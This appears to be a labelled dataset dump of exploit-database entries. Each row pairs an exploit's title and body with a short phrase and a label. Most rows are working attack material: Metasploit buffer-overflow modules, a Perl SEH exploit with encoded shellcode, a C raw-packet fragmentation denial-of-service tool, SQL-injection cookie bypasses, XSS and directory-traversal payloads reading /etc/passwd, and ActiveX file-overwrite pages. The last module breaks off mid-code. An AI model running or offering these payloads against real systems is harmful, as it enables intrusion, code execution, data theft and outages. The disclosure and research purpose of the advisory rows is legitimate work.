45928,"Rockwell Automation Allen-Bradley PowerMonitor 1000 - Cross-Site Scripting # Exploit Title: Rockwell Automation Allen-Bradley PowerMonitor 1000 - Cross-Site Scripting # Date: 2018-11-27 # Exploit Author: Luca.Chiou # Vendor Homepage: https://www.rockwellautomation.com/ # Version: 1408-EM3A-ENT B # Tested on: It is a proprietary devices: https://ab.rockwellautomation.com/zh/Energy-Monitoring/1408-PowerMonitor-1000 # CVE : N/A  # 1. Description: # In Rockwell Automation Allen-Bradley PowerMonitor 1000 web page, # user can add a new user by access the /Security/Security.shtm. # When users add a new user, the new user’s account will in the post data. # Attackers can inject malicious XSS code in user’s account parameter of post data. # The user’s account parameter will be stored in database, so that cause a stored XSS vulnerability.  # 2. Proof of Concept: # Browse http://<Your Modem IP>/Security/Security.shtm # In page Security.shtm, add a new user # Send this post data:  /Security/cgi-bin/security|0|0|<script>alert(123)</script>","inject malicious XSS code in user’s account parameter of post data. The user’s account parameter will be stored in database,",1
16523,"Novell iPrint Client - ActiveX Control target-frame Buffer Overflow (Metasploit) ## # $Id: novelliprint_target_frame.rb 9262 2010-05-09 17:45:00Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'   class Metasploit3 < Msf::Exploit::Remote 	Rank = GreatRanking  	include Msf::Exploit::Remote::HttpServer::HTML 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Novell iPrint Client ActiveX Control target-frame Buffer Overflow', 			'Description'    => %q{ 				This module exploits a stack buffer overflow in Novell iPrint Client 5.30. When 				passing an overly long string via the ""target-frame"" parameter to ienipp.ocx 				an attacker can execute arbitrary code.  				NOTE: The ""operation"" variable must be set to a valid command in order to reach this 				vulnerability. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'jduck' ], 			'Version'        => '$Revision: 9262 $', 			'References'     => 				[ 					[ 'CVE', '2009-1568' ], 					[ 'BID', '37242' ], 					[ 'OSVDB', '60803' ], 					[ 'URL', 'http://secunia.com/advisories/37169/' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process', 				}, 			'Payload'        => 				{ 					'Space'         => 1456, 					'BadChars'      => ""\x00"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					[ 'iPrint 5.30 Windows Client', { 'Ret' => 0x100489ac } ] # p/p/r in ienipp.ocx v5.30 				], 			'DisclosureDate' => 'Dec 08 2009', 			'DefaultTarget'  => 0)) 	end  	def autofilter 		false 	end  	def check_dependencies 		use_zlib 	end  	def on_request_uri(cli, request) 		# Re-generate the payload. 		return if ((p = regenerate_payload(cli)) == nil)  		sploit = p.encoded  		# the following must be an invalid pointer (unreadable) 		sploit << [rand(0xffffffff) | 0xc0000000].pack('V')  		sploit << generate_seh_record(target.ret)  		distance = 8 + 4 + payload_space 		sploit << Metasm::Shellcode.assemble(Metasm::Ia32.new, ""jmp $-"" + distance.to_s).encode_string  		sploit << rand_text_alphanumeric(2048 - sploit.length)  		operations = [ 			""op-client-interface-version"", 			""op-client-version-info"", 			""op-client-is-printer-installed"", 			""op-user-get-role"", 			""op-printer-install"", 			""op-printer-remove"", 			""op-printer-get-status"", 			""op-printer-get-info"", 			""op-printer-pause"", 			""op-printer-resume"", 			""op-printer-purge-jobs"", 			""op-printer-list-users-jobs"", 			""op-printer-list-all-jobs"", 			""op-printer-send-test-page"", 			""op-printer-send-file"", 			""op-printer-setup-install"", 			""op-job-get-info"", 			""op-job-hold"", 			""op-job-release-hold"", 			""op-job-cancel"", 			""op-job-restart"", 			""op-dbg-printer-get-all-attrs"", 			""op-dbg-job-get-all-attrs"" 		] 		operation = operations[rand(operations.length)]  		# escape single quotes 		sploit = xml_encode(sploit)  		content = %Q|<html> <object classid='clsid:36723F97-7AA0-11D4-8919-FF2D71D0D32C'> <param name='operation' value='#{operation}' /> <param name='target-frame' value='#{sploit}' /> </object> </html> |  		content = Rex::Text.randomize_space(content)  		print_status(""Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}..."")  		# Transmit the response to the client 		send_response_html(cli, content)  		# Handle the payload 		handler(cli) 	end  	def xml_encode(str) 		ret = """" 		str.unpack('C*').each { |ch| 			case ch 			when 0x41..0x5a, 0x61..0x7a, 0x30..0x39 				ret << ch.chr 			else 				ret << ""&#x"" 				ret << ch.chr.unpack('H*')[0] 				ret << "";"" 			end 		} 		ret 	end  end","passing an overly long string via the ""target-frame"" parameter",1
22441,"Mozilla 1.x / Opera 7.0 - LiveConnect JavaScript Denial of Service source: https://www.securityfocus.com/bid/7227/info  A denial-of-service vulnerability has been reported to affect several browsers. The vulnerability occurs when executing certain malformed JavaScript-enabled pages.  An attacker can exploit this vulnerability by creating a malicious JavaScript page that makes a call to certain methods. When an affected browser is used to view the malformed page, the Java Virtual Machine will crash, resulting in a denial-of-service condition.  <script language=""Javascript""> t = new Packages.sun.plugin.javascript.navig5.JSObject(1,1); </script>",malformed JavaScript-enabled pages,1
6176,"PHPX 3.5.16 - Cookie Poisoning / Authentication Bypass =======================================================================                                 = gnix =                         gnixmail at gmail dot com                         http://gnix.netsons.org            Application:  phpx               http://www.phpx.org/project.php (stable version) Versions:     3.5.16 Platforms:    All Bug:          Cookie poisoning / Login bypass Date:         31 July 2008     =======================================================================    1. Intro   2. Cookie poisoning and login bypass    =======================================================================    1. Intro   ========    PHPX is a web portal system, blog,Content Management System (CMS), forums, and more. All files are currently hosted at http://www.phpx.org/project.php    =======================================================================    2. Cookie poisoning and login bypass   ====================================  Every file in phpx-3.5.16/ directory have two lines of code: one for include includes/functions.inc.php, and another to create a website object.  website's constructor will call checkCookie.     Source code (includes/functions.inc.php)   ---------------------------------------------------------------------   class website {     ...      function website(){       ...              $this->checkCookie();   ---------------------------------------------------------------------   The function checkCookie set the user_id if PXL cookie is set and the  query return an user_id, and an username.     Vulnerable code (includes/functions.inc.php lines 75 to 89)    ---------------------------------------------------------------------   function checkCookie(){      if ($_COOKIE[PXL]){       list($user_id, $username) = $this->core->db->fetch(""select user_id, username from users where sess = '$_COOKIE[PXL]'"");       if (!$user_id){         setcookie(""PXL"", '', time() - 60, '', '', $this->core->secure);         $head = ""Location: http://"" . $_SERVER[""HTTP_HOST""] .  $_SERVER[""REQUEST_URI""];         header($head);       }       else {         if (strtolower($username) == ""xnuiem""){ $this->debug = 1; }           $this->user_id = $user_id;       }     }   }   ---------------------------------------------------------------------   This user_id is then used in the website constructor for set the user_id of the core class.      Source code (includes/functions.inc.php line 32)   ---------------------------------------------------------------------   $this->core->user_id = $this->user_id;   ---------------------------------------------------------------------   Now if you want to get the admin privileges and by pass the login, you have to create a cookie like this below:      ---------------------------------------------------------------------   PXL=a' OR username='admin   ---------------------------------------------------------------------     To do that you can use 'Modify Headers'.    =======================================================================  # milw0rm.com [2008-07-31]",a malformed template request,1
9589,"OtsTurntables 1.00.027 - '.m3u' / '.ofl' Universal Local Buffer Overflow (SEH) #!/usr/bin/perl # by hack4love # hack4love@hotmail.com # OtsTurntables Free 1.00.027 (.m3u/ ofl File) Local Universal BOF Exploit (SEH) #--->> info:: 1.00.027 was released 3 March 2008 ###http://www.brothersoft.com/otsturntables-free-download-86957.html ## Original exploit::http://www.milw0rm.com/exploits/8371 ################################################################## my $bof=""\x41"" x 884; my $nsh=""\xEB\x06\x90\x90""; my $seh=""\xb8\x15\xd1\x72"";#TEST UNDER SP2///SP3 my $nop=""\x90"" x 20; my $sec= ""\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"". ""\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"". ""\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"". ""\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"". ""\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x34"". ""\x42\x50\x42\x50\x42\x30\x4b\x38\x45\x34\x4e\x43\x4b\x48\x4e\x47"". ""\x45\x30\x4a\x47\x41\x50\x4f\x4e\x4b\x48\x4f\x44\x4a\x41\x4b\x48"". ""\x4f\x55\x42\x52\x41\x30\x4b\x4e\x49\x54\x4b\x58\x46\x43\x4b\x38"". ""\x41\x50\x50\x4e\x41\x33\x42\x4c\x49\x49\x4e\x4a\x46\x48\x42\x4c"". ""\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x30\x41\x30\x44\x4c\x4b\x4e"". ""\x46\x4f\x4b\x43\x46\x55\x46\x32\x46\x30\x45\x47\x45\x4e\x4b\x48"". ""\x4f\x35\x46\x32\x41\x30\x4b\x4e\x48\x56\x4b\x58\x4e\x30\x4b\x44"". ""\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x51\x4b\x48"". ""\x41\x50\x4b\x4e\x49\x58\x4e\x55\x46\x42\x46\x30\x43\x4c\x41\x33"". ""\x42\x4c\x46\x36\x4b\x38\x42\x44\x42\x53\x45\x48\x42\x4c\x4a\x37"". ""\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x58\x42\x57\x4e\x51\x4d\x4a"". ""\x4b\x38\x4a\x36\x4a\x50\x4b\x4e\x49\x30\x4b\x48\x42\x48\x42\x4b"". ""\x42\x50\x42\x50\x42\x50\x4b\x48\x4a\x56\x4e\x33\x4f\x35\x41\x53"". ""\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x58\x42\x4c\x4b\x57"". ""\x42\x35\x4a\x46\x42\x4f\x4c\x58\x46\x50\x4f\x55\x4a\x36\x4a\x59"". ""\x50\x4f\x4c\x38\x50\x50\x47\x35\x4f\x4f\x47\x4e\x43\x36\x41\x56"". ""\x4e\x56\x43\x46\x42\x30\x5a""; print $bof.$nsh.$seh.$nop.$sec; ################################################################### open(myfile,'>> HACK4LOVE.m3u'); print myfile $bof.$nsh.$seh.$nop.$sec; ###################################################################  # milw0rm.com [2009-09-04]",a specially crafted .m3u file,1
9562,"JSFTemplating / Mojarra Scales / GlassFish - File Disclosure SEC Consult Security Advisory < 20090901-0 > =======================================================================               title: File disclosure vulnerability in JSFTemplating,                       Mojarra Scales and GlassFish Application Server v3 Admin                      console            products: JSFTemplating (FileStreamer/PhaseListener component)                      Mojarra Scales                      GlassFish Application Server v3 Preview (Admin console)  vulnerable version: JSFTemplating: all versions < v1.2.11                      Mojarra Scales: all versions < v1.3.2                      GlassFish: v3 Preview       fixed version: JSFTemplating: v1.2.11                      Mojarra Scales: v1.3.2                      GlassFish: v2 is not affected according to vendor              impact: critical            homepage: https://jsftemplating.dev.java.net                      http://kenai.com/projects/scales                      https://glassfish.dev.java.net               found: 2009-07-01                  by: J. Greil / SEC Consult / www.sec-consult.com =======================================================================  Vendor description: ------------------- Templating for JavaServerâ„¢ Faces Technology plugs into JavaServerâ„¢ Faces to make building pages and components easy.  Creating pages or components is done using a template file. JSFTemplating's design allows for multiple syntaxes, currently it supports 2 of its own plus most of the Facelets syntax. All syntaxes support all of JSFTemplating's features such as PageSession, Events & Handlers, dynamic reloading of page conent, etc.  source: https://jsftemplating.dev.java.net/#what also see:  http://kenai.com/projects/scales/ https://glassfish.dev.java.net/   Vulnerability overview/description: ----------------------------------- The JSFTemplating FileStreamer functionality (when using the PhaseListener), basically used for including static or dynamic content, such as Yahoo UI API files with Mojarra Scales, is vulnerable to  * file disclosure and also allows an attacker  * to retrieve directory listings of the whole server  Furthermore Mojarra Scales and the GlassFish Application Server (v3 Preview) Admin console are using vulnerable components too.  JSFTemplating/FileStreamer can be exploited to read sensitive application data on the whole server depending on the configuration. One tested server allowed us to access all files on the server (with rights of the webserver user), another server was restricted to files within the webroot (but including WEB-INF) - it might depend on the Java Security Model or filesystem rights.  An attacker is able to gain sensitive data such as configuration files (WEB-INF/web.xml), the whole source code of the application or other sensitive data on the server.  Furthermore it is possible to retrieve directory listings of directories on the whole server and the webroot by specifying a directory instead of a file.   Proof of concept: ----------------- The URLs to exploit this vulnerability may differ from server to server. The vulnerable HTTP parameters are usually named ""filename"" or ""file"".  By specifying the following URLs an attacker gains access to sensitive configuration files, source code or other possibly sensitive files:  ======================== /jsft_resource.jsf?contentSourceId=resourceCS&filename=WEB-INF/web.xml /jsft_resource.jsf?contentSourceId=resourceCS&filename=index.jsp /jsft_resource.jsf?contentSourceId=resourceCS&filename=at/mycompany/ /jsft_resource.jsf?contentSourceId=resourceCS&filename=at/mycompany/some.class ========================   By using an empty value for the file/filename parameter, a directory listing of the webroot is being shown. Directory traversal is also possible but it depends on the installation/configuration whether it is possible to access data outside the webroot.  ======================== /scales_static_resource.jsf?file= /scales_static_resource.jsf?file=../../../../../../etc/ /scales_static_resource.jsf?file=../../../../../../etc/passwd ========================   Vulnerable versions: -------------------- JSFTemplating:  * all versions < v1.2.11  Mojarra Scales: * all versions < v1.3.2  GlassFish: * v3 Preview (Admin console)  According to the vendor, GlassFish v2 does not use vulnerable components.  Vendor contact timeline: ------------------------ 2009-07-07: Contacting the developers of JSFTemplating by email. 2009-07-07: Very fast response from the developers by email and IRC, initial             attempts to fix the issue were being made 2009-07-08: Agreed on taking a further look into the issue by the end of July 2009-07-30: Contacted the developers again, they need more time 2009-08-10/13: Asked the developers for any news 2009-08-14: Anwser that the fix will make it into next release 2009-08-31: Fixes for JSFTemplating and Mojarra Scales available 2009-09-01: Coordinated release date  Special thanks to Jason and Ken!  Solution: --------- * Upgrade to the latest version of JSFTemplating, v1.2.11 has the fix: http://download.java.net/maven/1/com.sun.jsftemplating/jars/  CVS commit logs with some information regarding new security features can be found here: https://jsftemplating.dev.java.net/servlets/BrowseList?listName=cvs&by=date&from=2009-08-01&to=2009-08-31&first=1&count=16   * Upgrade to the latest version of Mojarra Scales, v1.3.2 has the fix: http://kenai.com/projects/scales/downloads/directory/Mojarra%20Scales%201.3.2/   * GlassFish: Use the current stable version v2 or see workaround section for v3.  Workaround: ----------- GlassFish v3 Preview: Use strong passwords for the GlassFish Admin console and restrict access to the Admin console port (4848).  Advisory URL: ------------- https://www.sec-consult.com/advisories_e.html#a61  ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ SEC Consult Unternehmensberatung GmbH  Office Vienna Mooslackengasse 17 A-1190 Vienna Austria  Tel.: +43 / 1 / 890 30 43 - 0 Fax.: +43 / 1 / 890 30 43 - 25 Mail: research at sec-consult dot com www.sec-consult.com  SEC Consult conducts periodical information security workshops on ISO  27001/BS 7799 in cooperation with BSI Management Systems. For more  information, please refer to https://www.sec-consult.com/academy_e.html  EOF J. Greil / @2009  # milw0rm.com [2009-09-01]",using an empty value for the file/filename parameter,1
15267,"Novel eDirectory DHost Console 8.8 SP3 - Local Overwrite (SEH) # Exploit Title: 	Novel eDirectory DHost Console 8.8 SP3 Local SEH Overwrite # Date: 		17/10/2010  # Author: 		d0lc3	 (@rmallof - http://elotrolad0.blogspot.com/) # Software Link: 	http://www.novell.com/ # Version: 		8.8 SP3 (20216.67)] # Tested on: 		win32 xp sp3 (spa)  #Summary: #	DHostCon.exe is prone to local denial of service caused by stack overflow #	triggered if user-supplied parameters are too long (1074 bytes). #	Due nature of this vulnerabilty, attackers could exploit this issue #	to execute arbitrary code on local host.  #PoC:  #!/usr/bin/python import os,struct  def main(): 	path=""C:\Novell\NDS\dhostcon.exe""	 	args=""x.x.x.x""				#ip server 	buf=""A""*1065 	nseh=struct.pack(""<L"",0x90909eeb)	#jmp short 0012ff50 +NOP + NOP 	seh=struct.pack(""<L"",0x61012c20)	#PPR dclient.dll 	 	shellcode=struct.pack(""<B"",0xCC)	#INT3  	crash=buf+shellcode+nseh+seh  	os.system(path+"" ""+args+"" ""+crash)	#Crash!  if __name__==""__main__"": 	main()",the malicious file,1
24634,"Microsoft Windows XP - TCP Packet Fragmentation Handling Denial of Service (1) // source: https://www.securityfocus.com/bid/11258/info  Multiple vendor implementations of the TCP stack are reported prone to a remote denial-of-service vulnerability.   The issue is reported to present itself due to inefficiencies present when handling fragmented TCP packets.   The discoverer of this issue has dubbed the attack style the ""New Dawn attack""; it is a variation of a previously reported attack that was named the ""Rose Attack"".   A remote attacker may exploit this vulnerability to deny service to an affected computer.   Microsoft Windows 2000/XP, Linux kernel 2.4 tree, and undisclosed Cisco systems are reported prone to this vulnerability; other products may also be affected.   /***     ROSE attack (variation 2) (chuck (at) lemure.net)          Discovered by:     gandalf (at) digital.net          code modified from large IGMP attack by:         Kox by Coolio (coolio (at) k-r4d.com)      Sends out small IP fragments totalling up to a large     ICMP packet.  Then repeatedly sends last IP Fragment forcing     reassembly code to traverse to last IP fragment in order to     do a free() followed by a malloc().  Or so it seems.      Reportedly works for TCP / UDP as well, since this is     a IP layer attack.   ***/  /* just a thousand kills win XP */  #define NUM_PACKETS 100   #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <netdb.h> #include <string.h> #include <errno.h> #include <pwd.h> #include <time.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/utsname.h> #include <netinet/in.h> #include <netinet/ip.h> #include <netinet/ip_icmp.h>  #include <netinet/ip_icmp.h>  void usage(char *arg) {         printf(""Rose attack\n"");         printf(""Usage: %s <victim> [source]\n"", arg); 	printf(""If source not specified, will send out from random ip's\n"");         exit(1); }   unsigned int randip() {         struct hostent *he;         struct sockaddr_in sin;         char *buf = (char *)calloc(1, sizeof(char) * 16); 	         sprintf(buf, ""%d.%d.%d.%d"",                 (random()%191)+23,                 (random()%253)+1,                 (random()%253)+1,                 (random()%253)+1);  	         return inet_addr(buf);          }  unsigned short in_cksum(unsigned short *buh, int len) {         register long sum = 0;         unsigned short oddbyte;         register unsigned short answer;          while(len > 1) {                 sum += *buh++;                 len -= 2;         }          if(len == 1) {                 oddbyte = 0;                 *((unsigned char *)&oddbyte) = *(unsigned char *)buh;                 sum += oddbyte;         }          sum = (sum >> 16) + (sum & 0xFFFF);         sum += (sum >> 16);         answer = ~sum;         return answer; }  int fire_away(struct sockaddr_in *victim, unsigned long src) {         int SMALLICMP = 1;         unsigned char *pkt;         struct iphdr *ip;         struct igmphdr *igmp; 	struct icmphdr *icmp_pkt;         struct utsname *un;         struct passwd *p; 	int idList[NUM_PACKETS]; 	unsigned long j;         int i, s; 	int id = (random() % 40000) + 500; 	for (i=0;i<NUM_PACKETS;i++) 	  idList[i]=(random() % 40000) + 500;                    pkt = (unsigned char *)calloc(1, SMALLICMP  				      + sizeof(struct iphdr) + 				      sizeof(struct icmphdr));         ip = (struct iphdr *)pkt;  	icmp_pkt = (struct icmphdr *)(pkt + sizeof(struct iphdr));         ip->version = 4;         ip->ihl = (sizeof *ip) / 4;         ip->ttl = 255;         ip->tot_len = htons(SMALLICMP);         ip->protocol = 1;         ip->id = htons(id);         ip->frag_off = htons(IP_MF);         ip->saddr = src;         ip->daddr = victim->sin_addr.s_addr;         ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));  	 	icmp_pkt->type = ICMP_ECHO; 	icmp_pkt->code = 0; 	icmp_pkt->checksum = 1000; 	icmp_pkt->un.echo.id = random() % 255; 	icmp_pkt->un.echo.sequence = random() % 255; 	         for(i = sizeof(struct iphdr) + sizeof(struct icmphdr) + 1;             i < SMALLICMP; i++){ 	  pkt[i] = random() % 255; 	   	} 	         if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {                 perror(""error: socket()"");                 return 1;         } 	 	printf("" Sending out series of small fragments\r\n""); 	 	for(i=0;i<NUM_PACKETS;i++){ 	  ip->id = htons(idList[i]); 	  for (j=0; j<8170; j += SMALLICMP + 1){	     	    ip->frag_off = htons(j | IP_MF); 	    if(sendto(s, pkt, 		      SMALLICMP + sizeof(struct iphdr),  		      0, (struct sockaddr *)victim, 		      sizeof(struct sockaddr_in)) == -1) {  	      perror(""error: sendto()""); 	      return 1; 	    } 	  } 	}  	printf("" Sending out tailing fragments\r\n""); 	/* big frag at end... */ 	/* sending a large amount of the end fragments over and 	   over.  This is definitely overkill, but seems to work */ 	for (j=0;j<9999*NUM_PACKETS;j++){ 	  for(i=0;i<NUM_PACKETS;i++){ 	    ip->id=htons(idList[i]); 	    ip->frag_off = htons(8190|IP_MF); 	    //ip->frag_off = htons(8100 | IP_MF); 	    sendto(s, pkt, sizeof(struct iphdr) + SMALLICMP,  		   0, (struct sockaddr *)victim,  		   sizeof(struct sockaddr_in)); 	    /* if you do sleep, CPU usage goes way down.  But memory usage 	       still creeps upward */ 	    //usleep(100); //sleep after every trailing packet 	  } 	  usleep(100); //sleep after every series of NUM_PACKETS 	}         free(pkt);         close(s);         return 0; }  int main(int argc, char *argv[]) {         struct sockaddr_in victim;         struct hostent *he; 	unsigned long source;         int i;          srandom(time(NULL));          if(argc < 2)                 usage(argv[0]);          if((he = gethostbyname(argv[1])) == NULL) {                 herror(argv[1]);                 exit(1);         } 	 	if (argc > 2){ 	  source = inet_addr(argv[2]); 	} 	else { 	  source = randip(); 	} 	         memcpy(&victim.sin_addr.s_addr, he->h_addr, he->h_length);         victim.sin_port = htons(0);         victim.sin_family = PF_INET;          printf(""Sending ICMP fragments:  \r\n"");         fflush(stdout); 	fire_away(&victim, source); 	if (argc < 3){ 	  source = randip(); 	} 	 	fflush(stdout); 	printf(""\nDONE\n"");         fflush(stdout); }",fragmented TCP packets,1
5496,"Watchfire Appscan 7.0 - ActiveX Multiple Insecure Methods **************************************************************************************************************** Multiple Insecure Methods in AppScan Watchfire Web Application Security v 7.0 Remote: Yes An arbitrary file overwrite has been discovered in an ActiveX control installed with the WatchFire Appscan v 7.0. by callAX -> Fr33d0m & Kn0wl3dg3 1s th3 r341 P0w3r ****************************************************************************************************************    <HTML>  <object id=ctrl classid=""clsid:{E302E486-D748-475C-84F3-4F7ED6F78EC5}""></object> <SCRIPT> function Do_it()  {    File = ""c:\\autoexec_.bat""    ctrl.CompactSave(File)  } </SCRIPT> <input language=JavaScript onclick=Do_it() type=button value=""Proof of Concept""> </BODY> </HTML>   <HTML> <BODY>  <object id=ctrl classid=""clsid:{AA9730F1-70F6-43DC-94FC-000000000004}""></object> <SCRIPT> function Do_it()  {    File = ""c:\\boot_.ini""    ctrl.saveRecordedExploreToFile(File)  } </SCRIPT> <input language=JavaScript onclick=Do_it() type=button value=""Proof of Concept""> </BODY> </HTML>    <HTML> <BODY>  <object id=ctrl classid=""clsid:{E302E486-D748-475C-84F3-4F7ED6F78EC5}""></object> <SCRIPT> function Do_it()  {    File = ""c:\\ntldr_""    ctrl.SaveSession(File)  } </SCRIPT> <input language=JavaScript onclick=Do_it() type=button value=""Proof of Concept""> </BODY> </HTML>  # milw0rm.com [2008-04-25]",the malicious page,1
26499,"PHPSysInfo 2.x - Multiple Input Validation Vulnerabilities source: https://www.securityfocus.com/bid/15396/info  phpSysInfo is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  phpSysInfo is prone to cross-site scripting, HTTP response splitting and arbitrary local file inclusion vulnerabilities.  An attacker can exploit these vulnerabilities to steal cookie-based authentication credentials, aid in phishing style attacks and retrieve privileged or sensitive information; other attacks are also possible.  http://www.example.com/index.php?VERSION=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E  http://www.example.com/index.php?_SERVER[HTTP_ACCEPT_LANGUAGE]=../../README%00 http://www.example.com/index.php?_SERVER[HTTP_ACCEPT_LANGUAGE]=../../README%00&lng=../../README%00 http://www.example.com//index.php?sensor_program=lmsensors.inc.php/../../README%00  http://www.example.com/index.php?charset=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2019%0d%0a%0d%0a<html>Hacked!</html>",malicious script code,1
21999,"Perception LiteServe 2.0.1 - Directory Query String Cross-Site Scripting source: https://www.securityfocus.com/bid/6143/info  A cross site scripting vulnerability has been discovered in Perception LiteServe.  It has been reported that LiteServe fails to sanitize query strings from indexed folders. It is possible for an attacker to exploit this issue by constructing a malicious link, containing encoded HTML and script code.  When the malicious link is clicked by an unsuspecting user, the attacker-supplied HTML and script code will be executed by their web client.  Attacks of this nature may make it possible for attackers to manipulate web content or to steal cookie-based authentication credentials. It may be possible to take arbitrary actions as the victim user.   http://liteserve.net/dir?%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28location%2Ehref%29%22%3E  http://liteserve.net/dir?%3C%2FTITLE%3E%3CIMG%20SRC%3D%22%22%20ONERROR%3D%22alert%28location%2Ehref%29%22%3E","constructing a malicious link, containing encoded HTML and script code",1
40145,"Rapid7 AppSpider 6.12 - Local Privilege Escalation ﻿ Rapid7 AppSpider 6.12 Web Application Vulnerability Scanner Elevation Of Privilege   Vendor: Rapid7, Inc. Product web page: https://www.rapid7.com Affected version: 6.12.10.1  Summary: While today's malicious attackers pursue a variety of goals, they share a preferred channel of attack - the millions of custom web, mobile, and cloud applications companies deploy to serve their customers. AppSpider dynamically scans these applications for vulnerabilities across all modern technologies, provides tools that speed remediation, and monitors applications for changes.  Desc: The application suffers from an unquoted search path issue impacting the services 'AppSpider REST Server', 'AppSpider REST Service' and 'AppSpiderUpgradeService' for Windows deployed as part of AppSpider solution. This could potentially allow an authorized but non-privileged local user to execute arbitrary code with elevated privileges on the system. A successful attempt would require the local user to be able to insert their code in the system root path undetected by the OS or other security applications where it could potentially be executed during application startup or reboot. If successful, the local user’s code would execute with the elevated privileges of the application.  Tested on: Microsoft Windows 7 Professional SP1 (EN)            Microsoft Windows 7 Ultimate SP1 (EN)   Vulnerability discovered by Gjoko 'LiquidWorm' Krstic                             @zeroscience   Advisory ID: ZSL-2016-5344 Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5344.php  Vendor: https://community.rapid7.com/docs/DOC-3455   05.07.2016  --   C:\>sc qc ""AppSpider REST Server"" [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: AppSpider REST Server         TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files (x86)\Rapid7\AppSpider6\restserviceworker\WebWindowsService.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : AppSpider REST Server         DEPENDENCIES       :         SERVICE_START_NAME : NT AUTHORITY\NetworkService   C:\>sc qc ""AppSpider REST Service"" [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: AppSpider REST Service         TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 2   AUTO_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files (x86)\Rapid7\AppSpider6\RestService\WebService.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : AppSpider REST Service         DEPENDENCIES       :         SERVICE_START_NAME : LocalSystem   C:\>sc qc AppSpiderUpgradeService [SC] QueryServiceConfig SUCCESS  SERVICE_NAME: AppSpiderUpgradeService         TYPE               : 10  WIN32_OWN_PROCESS         START_TYPE         : 3   DEMAND_START         ERROR_CONTROL      : 1   NORMAL         BINARY_PATH_NAME   : C:\Program Files (x86)\Rapid7\AppSpider6\AppSpiderUpgradeService\AppSpiderUpgradeService.exe         LOAD_ORDER_GROUP   :         TAG                : 0         DISPLAY_NAME       : AppSpiderUpgradeService         DEPENDENCIES       :         SERVICE_START_NAME : LocalSystem",malicious A. Obtain,1
16677,"CA AntiVirus Engine - CAB Buffer Overflow (Metasploit) ## # $Id: ca_cab.rb 10998 2010-11-11 22:43:22Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = GoodRanking  	include Msf::Exploit::FILEFORMAT  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'CA Antivirus Engine CAB Buffer Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in CA eTrust Antivirus 8.1.637. 					By creating a specially crafted CAB file, an an attacker may be able 					to execute arbitrary code. 			}, 			'License'        => MSF_LICENSE, 			'Author'         => [ 'MC' ], 			'Version'        => '$Revision: 10998 $', 			'References'     => 				[ 					[ 'CVE', '2007-2864' ], 					[ 'OSVDB', '35245'], 					[ 'BID', '24330' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-07-035.html' ], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'thread', 					'DisablePayloadHandler' => 'true', 				}, 			'Payload'        => 				{ 					'Space'    => 250, 					'BadChars' => ""\x00"", 					'StackAdjustment' => -3500, 					'PrependEncoder' => ""\x81\xc4\x54\xf2\xff\xff"", 				}, 			'Platform' => 'win', 			'Targets'        => 				[ 					[ 'Windows 2000 All / Windows XP SP0/SP1 (CA eTrust Antivirus 8.1.637)', { 'Ret' => 0x6dc886ea } ], # inocore.dll 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Jun 05 2007', 			'DefaultTarget'  => 0))  		register_options( 			[ 				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.cab']), 			], self.class) 	end  	def exploit  		cab_header =  ""\x4D\x53\x43\x46\x00\x00\x00\x00\xC4\x0D\x00\x00\x00\x00\x00\x00"" 		cab_header << ""\x2C\x00\x00\x00\x00\x00\x00\x00\x03\x01\x01\x00\x01\x00\x00\x00"" 		cab_header << ""\xD2\x04\x00\x00\x44\x00\x00\x00\x01\x00\x00\x00\x78\x0D\x00\x00"" 		cab_header << 